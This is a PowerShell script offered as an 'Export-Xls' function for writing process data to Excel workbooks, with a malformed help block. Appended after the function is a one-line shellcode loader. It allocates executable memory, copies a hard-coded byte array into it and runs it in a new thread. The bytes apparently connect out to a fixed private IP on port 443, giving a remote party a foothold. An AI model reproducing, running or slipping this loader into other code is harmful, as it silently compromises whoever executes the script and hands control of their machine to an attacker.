

function Export-Xls{
$data = Get-Process | Select-Object Name, Id, WS
PS> Export-Xls $data C:\Reports\MyWkb.xlsx -WorksheetName “WS” -AppendWorksheet:$false
.EXAMPLE
PS> $data = Get-Process | Select-Object Name, Id, WS
PS> Export-Xls $data C:\Reports\MyWkb.xlsx -SheetPosition “end”
.EXAMPLE
PS> $data = Get-Process | Select-Object Name, Id, WS
PS> Export-Xls $data C:\Reports\MyWkb.xlsx -WorksheetName “WS” -ChartType “xlColumnClustered”
.EXAMPLE
PS> $data = Get-Process | Select-Object Name, Id, WS
PS> Export-Xls $data C:\Reports\MyWkb.xlsx -WorksheetName “WS” -ChartType “xlColumnClustered” -AutoFilter:$true -SplitRow 1 -SplitColumn 1
.EXAMPLE
PS> $header = $headers = @(@(“Name”, “Process Name”),@(“ID”, “id”),@(“WS”, “WS”))
PS> $data = Get-Process | Select-Object Name, Id, WS
PS> Export-Xls $data C:\Reports\MyWkb.xlsx -Headers $header
This will result in a table where column A is titled “Process Name”, column B is titled “id” and column C is titled “WS”

param(
	[parameter(ValueFromPipeline = $true,Position=1)]
	, [ValidateNotNullOrEmpty()]
	, $InputObject
	, [parameter(Position=2)]
	, [ValidateNotNullOrEmpty()]
	, [string]$Path
	, [string]$WorksheetName = (“Sheet ” + (Get-Date).Ticks)
	, [string]$SheetPosition = “begin”
	, [PSObject]$ChartType
	, [switch]$NoTypeInformation = $true
	, [switch]$AppendWorksheet = $true
	, [switch]$AutoFilter = $true
	, [int]$SplitRow = 1
	, [int]$SplitColumn = 0
	, $Headers
)

begin{
[System.Reflection.Assembly]::LoadWithPartialName(“Microsoft.Office.Interop.Excel”)
if($ChartType)
{
	[microsoft.Office.Interop.Excel.XlChartType]$ChartType = $ChartType
}

function Set-ClipBoard{
	param(
		[string]$text
	)
	process{
	Add-Type -AssemblyName System.Windows.Forms
	$tb = New-Object System.Windows.Forms.TextBox
	$tb.Multiline = $true
	$tb.Text = $text
	$tb.SelectAll()
	$tb.Copy()
	}
}

function Add-Array2Clipboard {
	param (
		[PSObject[]]$ConvertObject,
		[switch]$Header
	)
process{
	$array = @()

	if ($Header) {
		$line =”"
		if ($headers) {
		foreach ($column in $headers) {
		$line += ([string]$column[1] + “`t”)
		}
	}
	else {
	$ConvertObject | Get-Member -MemberType Property,NoteProperty,CodeProperty | Select -Property Name | %{$line += ($_.Name.tostring() + “`t”)
	}
	}
	$array += ($line.TrimEnd(“`t”) + “`r”)
	}
	else {
	foreach($row in $ConvertObject){
	$line =”"
	if ($headers) {
	foreach ($column in $headers) {
	if ($row.($column[0])) {
	$val = [string] $row.($column[0])
	}
	else {
	$val = “”
	}
	$line += ($val + “`t”)
	
	}
	}
	else {
	$row | Get-Member -MemberType Property,NoteProperty | %{
	$Name = $_.Name
	if(!$Row.$Name){$Row.$Name = “”}
	$line += ([string]$Row.$Name + “`t”)
	}
	}
	$array += ($line.TrimEnd(“`t”) + “`r”)
	}
	}
	Set-ClipBoard $array
	}
}

[System.Threading.Thread]::CurrentThread.CurrentCulture = “en-US”
$excelApp = New-Object -ComObject “Excel.Application”
$originalAlerts = $excelApp.DisplayAlerts
$excelApp.DisplayAlerts = $false
if(Test-Path -Path $Path -PathType “Leaf”){
$workBook = $excelApp.Workbooks.Open($Path)
}
else{
$workBook = $excelApp.Workbooks.Add()
}
$sheet = $excelApp.Worksheets.Add($workBook.Worksheets.Item(1))
if(!$AppendWorksheet){
$workBook.Sheets | where {$_ -ne $sheet} | %{$_.Delete()}
}
$sheet.Name = $WorksheetName
if($SheetPosition -eq “end”){
$nrSheets = $workBook.Sheets.Count
2..($nrSheets) |%{
$workbook.Sheets.Item($_).Move($workbook.Sheets.Item($_ – 1))
}
}

if (($SplitRow -gt 0) -or ($SplitColumn -gt 0)) {
$excelApp.ActiveWindow.SplitRow = $SplitRow
$excelApp.ActiveWindow.SplitColumn = $SplitColumn
$excelApp.ActiveWindow.FreezePanes = $true
}

$sheet.Activate()
$array = @()
}

process{
$array += $InputObject
}

end{
Add-Array2Clipboard $array -Header:$True
$selection = $sheet.Range(“A1″)
$selection.Select() | Out-Null
$sheet.Paste()
$Sheet.UsedRange.HorizontalAlignment = [microsoft.Office.Interop.Excel.XlHAlign]::xlHAlignCenter
Add-Array2Clipboard $array
$selection = $sheet.Range(“A2″)
$selection.Select() | Out-Null
$sheet.Paste() | Out-Null
$selection = $sheet.Range(“A1″)
$selection.Select() | Out-Null

if ($AutoFilter) {
$sheet.UsedRange.EntireColumn.AutoFilter()
}
$sheet.UsedRange.EntireColumn.AutoFit() | Out-Null

$workbook.Sheets.Item(1).Select()
if($ChartType){
$sheet.Shapes.AddChart($ChartType) | Out-Null
}
$workbook.SaveAs($Path)
$excelApp.DisplayAlerts = $originalAlerts
$excelApp.Quit()
Sleep -s 3
Stop-Process -Name “Excel”
}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xa1,0x8c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

